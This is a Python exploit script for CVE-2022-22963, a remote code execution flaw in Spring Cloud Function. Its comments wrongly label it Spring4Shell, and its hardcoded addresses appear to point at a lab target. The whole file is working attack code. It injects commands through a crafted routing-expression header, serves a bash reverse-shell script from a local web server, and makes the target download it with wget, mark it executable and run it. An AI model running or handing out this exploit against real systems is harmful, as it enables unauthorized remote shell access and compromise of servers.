# Spring Cloud Function Vulnerability (CVE-2022-22963) RCE
# This is a python implemetation of Spring4Shell, CVE-2022-22963, 
# affecting services running Spring Cloud Function <=3.1.6 (for 3.1.x) 
# and <=3.2.2 (for 3.2.x)
# Combination of multiple POCs online
# Author: Randall Banner
# Date: 17/04/23

# Description:
# Script creates shell.sh in current directory, with a simple bash reverse shell
# one-liner. Then starts a webserver to serve it to the victim via wget (output in 
# /dev/shm folder), next it makes shell.sh executable and finally runs it.
# Don't forget to start Netcat before running script!

import requests
import http.server
import socketserver
import sys
import signal
import time
import threading

proxies = {"http": "127.0.0.1:8080", "https": "127.0.0.1:8080"}

# GLOBALS
## LOCAL
lhost = "10.10.14.137"
lport = 443  # Port for listener
srvport = 8000  # Port to start HTTP Server
## REMOTE
rhost = "10.129.228.213"
rport = 8080
## URL
url = f"http://{rhost}:{rport}/functionRouter"

# FOR DEBUGGING, sudo tcpdump icmp -i tun0
def ping_test(url, lhost):
    print("[+] Ping Test...")
    payload = f"ping -c 1 {lhost}"
    header = {
        f"spring.cloud.function.routing-expression": f'T(java.lang.Runtime).getRuntime().exec("{payload}")'
    }
    data = "data"
    # response = requests.post(url, headers=header, data=data, proxies=proxies)
    response = requests.post(url, headers=header, data=data)
    print("[++] Done")


def make_shell(lhost, lport):
    print("[+] Creating shell.sh in current Directory...")
    file_name = "shell.sh"
    revsh = f"#! /bin/bash\n/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    with open(file_name, "w") as file:
        file.write(revsh)
    print("[++] Done")


def send_shell(url, lhost, srvport):
    print("[+] Sending shell to /dev/shm/shell.sh...")
    payload = f"wget http://{lhost}:{srvport}/shell.sh -P /dev/shm/"
    header = {
        f"spring.cloud.function.routing-expression": f'T(java.lang.Runtime).getRuntime().exec("{payload}")'
    }
    data = "data"
    response = requests.post(url, headers=header, data=data, timeout=5)
    print("[++] Done")


def shell_permissions(url):
    print("[+] Making the shell executable...")
    payload = "chmod +x /dev/shm/shell.sh"
    header = {
        f"spring.cloud.function.routing-expression": f'T(java.lang.Runtime).getRuntime().exec("{payload}")'
    }
    data = "data"
    # response = requests.post(url, headers=header, data=data, proxies=proxies)
    response = requests.post(url, headers=header, data=data)
    print("[++] Done")


def execute_shell(url):
    print("[+] Executing shell...")
    payload = "/dev/shm/shell.sh"
    header = {
        f"spring.cloud.function.routing-expression": f'T(java.lang.Runtime).getRuntime().exec("{payload}")'
    }
    data = "data"
    # response = requests.post(url, headers=header, data=data, proxies=proxies)
    response = requests.post(url, headers=header, data=data)


# HTTP SERVER
# Global variable to hold the HTTP server instance
httpd = None

def start_http_server(port=8000, directory="."):
    global httpd
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", port), Handler)
    print(f"[+] Serving on port {port}")
    print("[!] Press Ctrl+C to stop the server")
    httpd_thread = threading.Thread(target=httpd.serve_forever)
    httpd_thread.start()


def stop_http_server():
    global httpd
    if httpd:
        httpd.shutdown()
        httpd.server_close()
        print("[+] Server stopped.")


def countdown():
    print("[+] Giving the server time to process...")
    for i in range(5, 0, -1):
        c = "z " * i
        print("\t" + c)
        time.sleep(1)
    print("[++] Countdown finished!")


if __name__ == "__main__":
    # Start the HTTP server
    start_http_server(srvport)
    # Create shell.sh
    make_shell(lhost, lport)
    # Send it
    send_shell(url, lhost, srvport)
    # Sleep 5
    countdown()
    # chmod shell.sh
    shell_permissions(url)
    # Execute shell.sh
    execute_shell(url)
    # Stop the HTTP server
    stop_http_server()
    # FOR RCE TESTING PURPOSES
    # ping_test(url, lhost)
